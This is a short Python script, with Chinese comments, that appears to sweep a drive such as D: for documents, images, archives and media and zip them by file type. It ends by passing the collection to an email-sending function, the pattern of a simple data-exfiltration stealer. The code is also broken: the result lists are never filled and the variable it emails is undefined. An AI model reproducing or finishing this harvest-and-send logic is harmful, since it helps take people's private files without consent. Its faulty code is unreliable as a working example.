
# -*- coding:utf-8 -*-
import os,zipfile
from SearchPath import fSearchPath
from EMAIL import fsend

def compress_get(dir):
    keylist = ['txt','doc','docx','pdf','zip','rar','jpg','gif','png','bmp','mp4','mp3']
    result=[]
    result_txt = []
    result_doc = []
    result_docx = []
    result_pdf = []
    result_zip = []
    result_rar = []
    result_jpg = []
    result_gif = []
    result_png = []
    result_bmp = []
    result_mp4 = []
    result_mp3 = []
    print("开始检索["+dir+"]目录下的文件")
    #遍历
    fSearchPath(dir)
    #输出
    if result_txt:
        resultzip = zipfile.ZipFile(dir+'_txt.zip','w')
        for i in result_txt:
            resultzip.write(i)
    if result_doc:
        resultzip = zipfile.ZipFile(dir+'_doc.zip','w')
        for i in result_doc:
            resultzip.write(i)
    if result_docx:
        resultzip = zipfile.ZipFile(dir+'_docx.zip','w')
        for i in result_docx:
            resultzip.write(i)
    if result_pdf:
        resultzip = zipfile.ZipFile(dir+'_pdf.zip','w')
        for i in result_pdf:
            resultzip.write(i)

    if result_zip:
        resultzip = zipfile.ZipFile(dir+'_zip.zip','w')
        for i in result_zip:
            resultzip.write(i)
    if result_rar:
        resultzip = zipfile.ZipFile(dir+'_rar.zip','w')
        for i in result_rar:
            resultzip.write(i)

    if result_jpg:
        resultzip = zipfile.ZipFile(dir+'_jpg.zip','w')
        for i in result_jpg:
            resultzip.write(i)
    if result_gif:
        resultzip = zipfile.ZipFile(dir+'_gif.zip','w')
        for i in result_gif:
            resultzip.write(i)
    if result_png:
        resultzip = zipfile.ZipFile(dir+'_png.zip','w')
        for i in result_png:
            resultzip.write(i)
    if result_bmp:
        resultzip = zipfile.ZipFile(dir+'_bmp.zip','w')
        for i in result_bmp:
            resultzip.write(i)

    if result_mp4:
        resultzip = zipfile.ZipFile(dir+'_mp4.zip','w')
        for i in result_mp4:
            resultzip.write(i)
    if result_mp3:
        resultzip = zipfile.ZipFile(dir+'_mp3.zip','w')
        for i in result_mp3:
            resultzip.write(i)

    print('result_txt: ',result_txt)
    print('result_doc: ',result_doc)
    print('result_docx: ',result_docx)
    print('result_pdf: ',result_pdf)

    print('result_zip: ',result_zip)
    print('result_rar: ',result_rar)

    print('result_jpg: ',result_jpg)
    print('result_gif: ',result_gif)
    print('result_png: ',result_png)
    print('result_bmp: ',result_bmp)

    print('result_mp4: ',result_mp4)
    print('result_mp3: ',result_mp3)
    fsend(data)

#compress_get('D:',"D:\\实验1.zip")
